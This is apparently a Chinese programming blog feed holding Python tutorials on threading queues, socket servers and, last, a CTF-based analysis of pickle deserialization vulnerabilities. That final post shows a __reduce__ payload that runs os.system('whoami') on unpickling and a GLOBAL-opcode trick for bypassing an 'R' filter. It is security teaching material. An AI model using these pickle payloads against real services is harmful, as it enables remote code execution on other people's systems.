main()</code></pre><p><code>acquire(blocking=布尔值,timeout=None)</code></p><ul><li>本方法用于获得Semaphore</li><li>blocking默认值是True，此时，如果内部计数器值大于0，则减一，并返回；如果等于0，则阻塞，等待其他线程调用release()以使计数器加1；本方法返回True，或无线阻塞</li><li>如果blocking=False,则不阻塞，如若获取失败，则返回False</li><li>当设定了timeout的值，最多阻塞timeout秒，如果超时，返回False。</li></ul><p><code>release()</code></p><ul><li>释放Semaphore，内部计数器加1，可以唤醒等待的线程</li></ul><p>结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt loading="lazy"></p><h3 id="生产者，消费者-多线程"><a href="#生产者，消费者-多线程" class="headerlink" title="生产者，消费者(多线程)"></a>生产者，消费者(多线程)</h3><p><strong>queue模块</strong></p><p><strong>类</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Queue(maxsize=0)</td><td align="center">创建一个先入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">LifoQueue(maxsize=0)</td><td align="center">创建一个后入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">PriorityQueue(maxsize=0)</td><td align="center">创建一个优先级队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr></tbody></table><p><strong>异常</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Empty</td><td align="center">当对空队列调用get*()方法时抛出异常</td></tr><tr><td align="center">Full</td><td align="center">当对已满的队列调用put*()方法时抛出异常</td></tr></tbody></table><p><strong>方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">qsize()</td><td align="center">返回队列大小(由于返回时队列大小可能被其它线程修改m，所以该值为近似值)</td></tr><tr><td align="center">empty()</td><td align="center">如果队列为空，则返回True，否则返回False</td></tr><tr><td align="center">full()</td><td align="center">如果队列已满，则返回True，否则返回False</td></tr><tr><td align="center">put(item,block=True,timeout=None)</td><td align="center">将item放入队列，如果block为True（默认），且timeout为None，则在有可用空间之前阻塞，如果timeout为正值，则最多阻塞timeout秒，如果block为False，则抛出Empty异常</td></tr><tr><td align="center">put_nowait(item)</td><td align="center">和put(item,Flase)相同</td></tr><tr><td align="center">get(block=True,timeout-None)</td><td align="center">从队列中取得元素，如果给定了block（非0），则一直阻塞到有可用的元素为止</td></tr><tr><td align="center">get_nowait()</td><td align="center">和get(False)相同</td></tr><tr><td align="center">task_done()</td><td align="center">用于表示队列中的某个元素已执完成，该方法会被下面的join()使用</td></tr><tr><td align="center">join()</td><td align="center">在队列中所有元素执行完毕并调用上面的task_done()信号之前，保持阻塞</td></tr></tbody></table><pre class="language-python" data-language="python"><code class="language-python">from time import sleepfrom queue import Queuefrom myThread import MyThreaddef writeQ(queue):    queue.put(&quot;xxx&quot;,1)    print(&quot;producing object for Q... &quot;,end&#x3D;&quot;&quot;)    print(&quot;size now &quot;,queue.qsize())def randQ(queue):    val &#x3D; queue.get()    print(&quot;consumed object from Q... size now &quot;, queue.qsize())def writer(queue, loops):   #写数据入队列    for i in range(loops):        writeQ(queue)def reader(queue, loops):   #从队列中取出数据    for i in range(loops):        randQ(queue)        sleep(2)            #添加延时便于观察funcs &#x3D; [reader, writer]nfuncs &#x3D; range(len(funcs))def main():    nloops &#x3D; 5    q &#x3D; Queue(32)    threads &#x3D; []    for i in nfuncs:        t &#x3D; MyThread(funcs[i], (q, nloops), funcs[i].__name__)        threads.append(t)    for i in nfuncs:        threads[i].start()    for i in nfuncs:        threads[i].join()    print(&quot;all DONE&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt loading="lazy"></p><h3 id="生产者，消费者-多进程"><a href="#生产者，消费者-多进程" class="headerlink" title="生产者，消费者(多进程)"></a>生产者，消费者(多进程)</h3><p><code>multiprocessing</code>模块方法参考python官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing">multiprocessing</a> — 基于进程的并行</p><pre class="language-python" data-language="python"><code class="language-python">from multiprocessing import Process, JoinableQueueimport timeimport randomdef consumer(q, name):    while True:        res &#x3D; q.get()  #从对列中取出并返回对象        time.sleep(random.randint(1, 3))        print(&#39;%s 吃掉了 %s&#39; % (name, res))        q.task_done()  #发送信号给q.join(),说明已经从队列中取走一个数据并处理完毕def producer(q, name, food):    time.sleep(random.randint(1, 3))    res &#x3D; &#39;%s&#39; % (food)    q.put(res)  #将res放入队列    print(&#39;%s 生产了 %s&#39; % (name, res))    q.join()    # 等到消费者把自己放入队列中的所有的数据都取走之后，生产者才结束if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    q &#x3D; JoinableQueue()     # 使用JoinableQueue()    foods &#x3D; [&quot;包子&quot;,&quot;豆浆&quot;,&quot;油条&quot;,&quot;稀饭&quot;]    producerthreads &#x3D; []    consumerthreads &#x3D; []    for i in range(len(foods)):        t &#x3D; Process(target&#x3D;producer, args&#x3D;(q, &#39;厨师&#39;, foods[i]))        producerthreads.append(t)        producerthreads[-1].start()    for i in range(len(foods)):        t &#x3D; Process(target&#x3D;consumer, args&#x3D;(q, &#39;吃货&#39;))        consumerthreads.append(t)        consumerthreads[-1].daemon &#x3D; True        consumerthreads[-1].start()    for i in range(len(producerthreads)):        producerthreads[i].join()    # 1、主进程等生产者p1,p2,p3结束    # 2、而p1，p2，p3，是在消费者把所有数据都取干净之后才会结束    # 3、所以一旦p1,p2,p3结束了，证明消费者也没必要存在了，应该随着主进程一块死掉，因而需要将生产者们设置成守护进程    print(&quot;END&quot;)</code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-网络编程</title>
      <link href="/posts/c0f9c454/"/>
      <url>/posts/c0f9c454/</url>
      
        <content type="html"><![CDATA[<h3 id="scoket模块"><a href="#scoket模块" class="headerlink" title="scoket模块"></a>scoket模块</h3><p>需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用<code>socket.scoket()</code>函数，它的一般语法如下：</p><pre class="language-python" data-language="python"><code class="language-python">socket(scoket_family,scoket_type,protocol&#x3D;0)</code></pre><p><code>scoket_family</code>可以是<code>AF_UNIX</code>或<code>AF_INET(6)</code></p><ul><li><strong>AF_UNIX</strong>：UNIX，用于单一的<code>UNIX</code>系统进程之间的通信</li><li><strong>AF_INET(6)</strong>：因特网，IPv4或IPv6</li></ul><p><code>scoket_type</code>可以是<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></p><ul><li><strong>SOCK_STREAM</strong>：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)</li><li><strong>SOCK_DGRAM</strong>：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol</li></ul><p><code>protocol</code>参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略</p><a id="more"></a><p>创建<code>TCP/IP</code>套接字</p><pre class="language-python" data-language="python"><code class="language-python">tcpSock &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</code></pre><p>创建<code>UPD/IP</code>套接字</p><pre class="language-python" data-language="python"><code class="language-python">udpSock &#x3D; socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</code></pre><p>服务器套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.bind()</td><td align="center">将地址(主机名字),绑定到套接字上，参数需要为元祖格式</td></tr><tr><td align="center">s.listen()</td><td align="center">设置并启动TCP监听器，参数为最大挂起连接数</td></tr><tr><td align="center">s.accept()</td><td align="center">被动接受TCP客户端连接，一直等待到连接到达(阻塞)</td></tr></tbody></table><p>客户端套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.connect()</td><td align="center">主动发起TCP服务器连接</td></tr><tr><td align="center">s.connect_ex()</td><td align="center">connect的扩展版本，会以错误码形式返回问题，而不是抛出一个异常</td></tr></tbody></table><p>普通套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.recv()</td><td align="center">接受TCP消息</td></tr><tr><td align="center">s.send()</td><td align="center">发送TCP消息</td></tr><tr><td align="center">s.sendall</td><td align="center">完整的发送TCP消息</td></tr><tr><td align="center">s.recvfrom()</td><td align="center">接收UDP消息</td></tr><tr><td align="center">s.sendto()</td><td align="center">发送UDP消息</td></tr><tr><td align="center">s.shutdown()</td><td align="center">关闭连接</td></tr><tr><td align="center">s.close()</td><td align="center">关闭套接字</td></tr></tbody></table><h3 id="TCP时间戳服务器"><a href="#TCP时间戳服务器" class="headerlink" title="TCP时间戳服务器"></a>TCP时间戳服务器</h3><p>服务器</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *from time import ctimeHOST &#x3D; &quot;0.0.0.0&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)tcpSerSock &#x3D; socket(AF_INET,SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)while(True):    print(&quot;Waiting for connection...&quot;)    tcpCliSock, addr &#x3D; tcpSerSock.accept()    print(&quot;...connected from:&#123;&#125;&quot;.format(addr))    while(True):        data &#x3D; tcpCliSock.recv(BUFSIZ)        if not data:            break        tcpCliSock.send(&quot;[&#123;&#125;] &#123;&#125;&quot;.format(ctime(),data.decode()).encode())    tcpCliSock.close()tcpSerSock.close()</code></pre><p>客户端</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *from time import ctimeHOST &#x3D; &quot;192.168.0.102&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)tcpCliSock &#x3D; socket(AF_INET,SOCK_STREAM)tcpCliSock.connect(ADDR)while(True):    data &#x3D; input(&#39;&gt; &#39;)    if not data:        break    tcpCliSock.send(data.encode())    data &#x3D; tcpCliSock.recv(BUFSIZ)    if not data:        break    print(data.decode())tcpCliSock.close()</code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408155313046.png" alt loading="lazy"></p><h3 id="UDP时间戳服务器"><a href="#UDP时间戳服务器" class="headerlink" title="UDP时间戳服务器"></a>UDP时间戳服务器</h3><p>服务器</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *from time import ctimeHOST &#x3D; &quot;0.0.0.0&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)udpSerSock &#x3D; socket(AF_INET,SOCK_DGRAM)udpSerSock.bind(ADDR)while(True):    print(&quot;Waiting for message...&quot;)    data, addr &#x3D; udpSerSock.recvfrom(BUFSIZ)    udpSerSock.sendto(&quot;[&#123;&#125;] &#123;&#125;&quot;.format(ctime(),data.decode()).encode(),addr)    print(&quot;...received from and returned to :&#123;&#125;&quot;.format(addr))udpSerSock.close()</code></pre><p>客户端</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *HOST &#x3D; &quot;192.168.0.102&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)udpCliSock &#x3D; socket(AF_INET,SOCK_DGRAM)while(True):    data &#x3D; input(&#39;&gt; &#39;)    if not data:        break    udpCliSock.sendto(data.encode(),ADDR)    data, ADDR &#x3D; udpCliSock.recvfrom(BUFSIZ)    if not data:        break    print(data.decode())udpCliSock.close()</code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408162549689.png" alt loading="lazy"></p><h3 id="scoketserver模块"><a href="#scoketserver模块" class="headerlink" title="scoketserver模块"></a>scoketserver模块</h3><p><code>socketserver</code>是标准库中的一个高级别的模块。用于简化实现网络客户端与服务器所需要的大量样板代码。模块中已经实现了一些可以使用的类</p><table><thead><tr><th align="center">类</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BaseServer</td><td align="center">包含核心服务器功能和mix-in的钩子，仅用于推导，不创建类的实例</td></tr><tr><td align="center">TCPServer/UDPServer</td><td align="center">基础的网络同步TCP/UDP服务器</td></tr><tr><td align="center">UnixStreamServer/UnixDatagramServer</td><td align="center">基于文件的基础同步TCP/UDP服务器</td></tr><tr><td align="center">BaseRequestHandler</td><td align="center">包含处理服务器请求的核心功能，仅用于推导，不创建类的实例</td></tr><tr><td align="center">StreamRequestHandler/DatagramRequestHandler</td><td align="center">实现TCP/UDP服务器的服务处理器</td></tr></tbody></table><h3 id="scoketserver-TCP-服务器"><a href="#scoketserver-TCP-服务器" class="headerlink" title="scoketserver TCP 服务器"></a>scoketserver TCP 服务器</h3><p>服务器</p><pre class="language-python" data-language="python"><code class="language-python">from socketserver import (TCPServer as TCP, StreamRequestHandler as SRH)from time import ctimeHOST &#x3D; &quot;0.0.0.0&quot;PORT &#x3D; 22222ADDR &#x3D; (HOST,PORT)class MyRequestHandler(SRH):    def handle(self):        print(&quot;...conneceted from :&#123;&#125;&quot;.format(self.client_address))        self.wfile.write(&quot;[&#123;&#125;] &#123;&#125;&quot;.format(ctime(),self.rfile.readline().decode()).encode())tcpServ &#x3D; TCP(ADDR,MyRequestHandler)print(&quot;waiting for connection...&quot;)tcpServ.serve_forever()</code></pre><p>客户端</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *HOST &#x3D; &quot;192.168.0.102&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)while(True):    tcpCliSock &#x3D; socket(AF_INET,SOCK_STREAM)    tcpCliSock.connect(ADDR)    data &#x3D; input(&#39;&gt; &#39;)    if not data:        break    tcpCliSock.send(&quot;&#123;&#125;\r\n&quot;.format(data).encode())    data &#x3D; tcpCliSock.recv(BUFSIZ)    if not data:        break    print(data.decode().strip())    tcpCliSock.close()</code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408171411501.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python反序列化漏洞浅析</title>
      <link href="/posts/488d0f65/"/>
      <url>/posts/488d0f65/</url>
      
        <content type="html"><![CDATA[<h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt loading="lazy"></p><p>以上例子简单的示范了python进行序列化和反序列化的操作</p><a id="more"></a><h3 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h3><p>为了能够更深层的理解python反序列化的过程，这里需要用到一个python自带的pickle调试器<code>pickletools</code>库，这个库有三个功能：</p><ul><li>反汇编一个已经被打包的字符串   <code>pickletools.dis</code></li><li>优化一个已经被打包的字符串       <code>pickletools.optimize</code></li><li>返回一个迭代器来供程序使用       <code>pickletools.genops</code></li></ul><p>一般我们使用前两个功能，可以先看一下效果：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python反序列化漏洞浅析/image-20200405205451074.png" style="zoom:80%;" loading="lazy"><p>这就是反汇编的功能，解析那个字符串，然后告诉你这个字符串干了什么，每一行都是一条指令</p><p>序列化结构示意图（转）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405211802380.png" alt loading="lazy"></p><p>栈是反序列化最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，前序栈保存了程序运行至今的（不在顶层的）完整的栈信息。</p><p>存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西。</p><p>下面我们试图来序列化一个类</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsclass dairy():    def __init__(self):        self.date &#x3D; 20202020        self.text &#x3D; &#39;语言&#39;        self.tode &#x3D; [&#39;计&#39;,&#39;算&#39;,&#39;机&#39;]today &#x3D; dairy()print(pickle.dumps(today))x &#x3D; pickle.dumps(today)x &#x3D; pickletools.optimize(x)   #优化，消除未使用的PUTpickletools.dis(x)     #反汇编一个已经打包的字符串，优化一个已经被打包的字符串</code></pre><p><code>pickle</code>构造出的字符串有很多个版本，在<code>pickle.loads</code>时可以用<code>protocol</code>参数指定协议的版本，目前这些协议有0,1,2,3,4号版本，默认使用的是3号版本，pickle协议版本向前兼容，所以不用担心0号版本的字符串交给<code>pickle.loads</code>后会发生什么意外</p><ul><li><strong>v0</strong> 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li><strong>v1</strong> 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li><strong>v2</strong> 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</li><li><strong>v3</strong> 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li><strong>v4</strong> 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</li></ul><p>以上代码除了将序列化后的字符串反汇编后还用<code>pickletools</code>的<code>optimize</code>方法来将反汇编后的代码进行了优化，优化后输出的结果如下：</p><pre class="language-shell" data-language="shell"><code class="language-shell">b&#39;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.&#39;        0: \x80 PROTO      3    2: c    GLOBAL     &#39;__main__ dairy&#39;   18: )    EMPTY_TUPLE   19: \x81 NEWOBJ   20: &#125;    EMPTY_DICT   21: (    MARK   22: X        BINUNICODE &#39;date&#39;   31: J        BININT     20202020   36: X        BINUNICODE &#39;text&#39;   45: X        BINUNICODE &#39;语言&#39;   56: X        BINUNICODE &#39;tode&#39;   65: ]        EMPTY_LIST   66: (        MARK   67: X            BINUNICODE &#39;计&#39;   75: X            BINUNICODE &#39;算&#39;   83: X            BINUNICODE &#39;机&#39;   91: e            APPENDS    (MARK at 66)   92: u        SETITEMS   (MARK at 21)   93: b    BUILD   94: .    STOPhighest protocol among opcodes &#x3D; 2</code></pre><p>其中因为使用了<code>optimize</code>方法省略了<code>q  BINPUT   x</code>这一行汇编指令，这行指令的意思是把当前栈的栈顶复制一份，放进存储区，</p><p>下面对优化后的代码一行一行的进行解释</p><pre class="language-none"><code class="language-none">0: \x80 PROTO      3</code></pre><p><code>\x80</code>：版本(<code>protocol</code>)2后加入，机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。代表这个是依据3号协议序列化的字符串，随后这个操作结束。</p><pre class="language-none"><code class="language-none">2: c    GLOBAL     &#39;__main__ dairy&#39;</code></pre><p><code>c</code>操作符：连续读取两个字符串<code>module</code>和<code>name</code>，规定以<code>\n</code>为分割给<code>find_class</code>方法，然后把<code>module.name</code>压入栈，现在读取到的是<code>main.dairy</code>，放入栈中，通常用来获取一个模块中的属性</p><pre class="language-none"><code class="language-none">18: )    EMPTY_TUPLE</code></pre><p><code>)</code>操作符：把一个空的<code>tuple</code>压入当前栈</p><pre class="language-none"><code class="language-none">19: \x81 NEWOBJ</code></pre><p><code>\x81</code>操作符：从栈中先弹出一个元素，记为<code>args</code>，再弹出一个元素记为<code>cls</code>，接下来执行<code>cls.new(cls,*args)</code>，然后把得到的东西压入栈，简单来说，从栈中弹出一个参数和一个<code>class</code>，然后利用这个参数实例化<code>class</code>，把得到的实例压入栈 </p><pre class="language-none"><code class="language-none">20: &#125;    EMPTY_DICT</code></pre><p><code>&#125;</code>操作符：把一个空的<code>dict</code>压进栈</p><pre class="language-none"><code class="language-none">21: (    MARK</code></pre><p>MARK操作符：这个操作符干的事称为<code>load_mark</code>，把当前栈这个整体，作为一个<code>list</code>，压进前序栈，把当前栈清空</p><pre class="language-none"><code class="language-none">22: X        BINUNICODE &#39;date&#39;</code></pre><p><code>X</code>操作符：和V操作符一样是读入字符串压入堆栈，后面跟的四个字节代表字符串长度，如：<code>X\x04\x00\x00\x00date</code></p><pre class="language-none"><code class="language-none">31: J        BININT     20202020</code></pre><p>J操作符：和X和V一样，只不过这个是4字节发的int型（个人理解）</p><pre class="language-none"><code class="language-none">65: ]        EMPTY_LIST</code></pre><p><code>]</code>操作符，把一个空的<code>list</code>压进栈</p><pre class="language-none"><code class="language-none">91: e            APPENDS    (MARK at 66)</code></pre><p>MARK结束，通过最上面的（66行）堆栈片扩展堆栈上的列表，简单来说就是形成一个列表（个人理解）</p><pre class="language-none"><code class="language-none">92: u        SETITEMS   (MARK at 21)</code></pre><p>调用<code>pop_mark</code>，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态，从27行开始区分键值对，两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value</p><pre class="language-none"><code class="language-none">93: b    BUILD</code></pre><p>把当前栈栈顶存进<code>state</code>，然后弹掉，把当前栈顶记为<code>inst</code>，然后弹掉，利用<code>state</code>这系列的值来更新实例<code>inst</code>，把得到的对象扔到当前栈，如果<code>inst</code>拥有<code>__setstate__</code>方法，则吧<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。实际上这里就有一个安全漏洞</p><pre class="language-none"><code class="language-none">94: .    STOP</code></pre><p><code>.</code>：STOP指令，当前栈顶元素就是反序列化的最终结果，把他弹出</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><p><code>__reduce__</code>的指令码为<code>R</code>，他在反序列化的时候干了这么一件事</p><ul><li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li><li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li><li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li></ul><p>class的<code>__reduce__</code>方法在pickle反序列化的时候会被执行（类似php中的<code>__wakeup</code>），其底层的编码方法就是利用了R指令，f要么返回字符串，要么返回一个tuple，后者就可以进行利用，payload如下：</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport pickletoolsimport osclass dairy():    def __init__(self):        self.date &#x3D; 20202020        self.text &#x3D; &#39;语言&#39;        self.tode &#x3D; [&#39;计&#39;,&#39;算&#39;,&#39;机&#39;]    def __reduce__(self):                      #反序列化时执行，底层编码方法使用R指令码，        return (os.system,(&#39;whoami&#39;,))today &#x3D; dairy()#print(pickle.dumps(today))x &#x3D; pickle.dumps(today)x &#x3D; pickletools.optimize(x)  #优化，消除未使用的PUTpickletools.dis(x)           #反汇编一个已经打包的字符串，优化一个已经被打包的字符串</code></pre><p>得到以下结果</p><pre class="language-shell" data-language="shell"><code class="language-shell">b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;    0: \x80 PROTO      3    2: c    GLOBAL     &#39;nt system&#39;   13: X    BINUNICODE &#39;whoami&#39;   24: \x85 TUPLE1   25: R    REDUCE   26: .    STOPhighest protocol among opcodes &#x3D; 2</code></pre><p>随后将序列化的内容反序列化</p><pre class="language-python" data-language="python"><code class="language-python">b &#x3D; b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;hack &#x3D; pickle.loads(b)</code></pre><p>随后就可得到命令执行的结果</p><h4 id="c指令码"><a href="#c指令码" class="headerlink" title="c指令码"></a>c指令码</h4><p>先来看下面一段代码：</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport base64class student():    def __init__(self,name,grade):        self.name &#x3D; name        self.grade &#x3D; grade    def __eq__(self,other):     # 定义内置方法,当判断两个对象的值是否相等时，触发此方法        return type(other) is student and self.name &#x3D;&#x3D; other.name and self.grade &#x3D;&#x3D; other.grade        #is比较地址print(pickle.dumps(student(&#39;czj&#39;,&#39;extrader&#39;)))import bluedef check(data):    if b&#39;R&#39; in data:        return &#39;no reduce!&#39;    x &#x3D; pickle.loads(data)    if(x !&#x3D; student(blue.name,blue.grade)):        return &#39;Not equal &gt;_&lt;&#39;    return &#39;well done!&#39;try:    print(check(base64.b64decode(input())))except:    pass</code></pre><p><code>blue.py</code>中：</p><pre class="language-python" data-language="python"><code class="language-python">name &#x3D; &quot;A&quot;grade &#x3D; &quot;B&quot;</code></pre><p>以上代码过滤了<code>R</code>指令码，<code>check</code>方法中检测到<code>input</code>的<code>date</code>中含有<code>R</code>指令码就直接被返回<code>no reduce!</code>，函数给出了一个输入点，在将<code>input</code>的<code>data</code>参数反序列化后需要其中的name和grade和blue这个module中的name和grade相对应，也就是说我们需要利用序列化后的student类，来令其相等</p><p>这里如果我们知道blue.py中参数的值的话，直接构造<code>name = &quot;A&quot;</code>，<code>grade = &quot;B&quot;</code>的payload即可，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174320049.png" alt loading="lazy"></p><p>但是在我们不知道blue.py的前提下如何绕过呢？这里就要用到我们的c指令码了</p><p>c指令码是专门用来获取一个全局变量的</p><p>先看一下反汇编后输出的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174942602.png" alt loading="lazy"></p><p>利用c指令替换掉<code>czj</code>和<code>extrader</code>中两个字符串，将<code>pickle.dumps</code>后的<code>bytes</code>字符串中的<code>X\x03\x00\x00\x00czj</code>替换成<code>cblue\nname\n</code>，<code>X\x08\x00\x00\x00extrader</code>替换成<code>cblue\ngrade\n</code>随后base64编码后观察效果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt loading="lazy"></p><p>可以清楚的看到c指令码替换成功，随后也成功的绕过了比较</p><p>但如果c指令的<code>module</code>被限制了呢？c指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法，然而<code>find_class</code>可以被重写，如果c指令码只允许包含<code>__main__</code>这一个<code>module</code>，又该如何解决？代码如下</p><pre class="language-python" data-language="python"><code class="language-python">import pickleimport base64import pickletoolsimport blueimport ioimport sysclass student():    def __init__(self,name,grade):        self.name &#x3D; name        self.grade &#x3D; grade    def __eq__(self,other):             return type(other) is student and self.name &#x3D;&#x3D; other.name and self.grade &#x3D;&#x3D; other.gradeclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module &#x3D;&#x3D; &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))        #通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()def check(data):    try:        if &#39;R&#39; in data:            return &#39;no reduce!&#39;        if type(restricted_loads(eval(data))) is not student:            return &quot;false!&quot;        x &#x3D; pickle.loads(eval(data))        if(x !&#x3D; student(blue.name,blue.grade)):            return &#39;Not equal &gt;_&lt;&#39;        return &#39;well done!&#39;    except:        return &quot;Something wrong&quot;try:    print(check(base64.b64decode(input().encode(&quot;utf8&quot;)).decode(&quot;utf8&quot;)))except:    pass</code></pre><p><code>blue.py</code>中：</p><pre class="language-python" data-language="python"><code class="language-python">name &#x3D; &quot;A&quot;grade &#x3D; &quot;B&quot;</code></pre><p>题目部分来自XCTF高校战疫的一道题：webtmp</p><p>这道题就将input的date的modules进行了判断，如果不是<code>__main__ 